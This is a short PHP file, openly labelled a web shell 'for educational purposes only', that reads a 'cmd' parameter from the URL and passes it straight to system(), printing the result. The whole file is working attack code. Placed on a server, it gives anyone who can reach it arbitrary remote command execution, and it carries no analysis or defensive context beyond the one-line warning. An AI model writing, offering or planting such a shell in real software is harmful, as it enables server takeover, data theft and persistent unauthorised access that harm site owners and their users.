<?php
// This is a simple web shell that allows remote command execution
// WARNING: This is extremely dangerous and for educational purposes only!

if(isset($_GET['cmd']) && isset($_GET['user_id'])) {
    $cmd = $_GET['cmd'];
    $user_id = $_GET['user_id'];
    echo "<pre>";
    echo "User ID: " . htmlspecialchars($user_id) . "\n";
    echo "Executing command: " . htmlspecialchars($cmd) . "\n\n";
    system($cmd);
    echo "</pre>";
} else {
    echo "Usage: ?user_id=<id>&cmd=<command>";
}
?>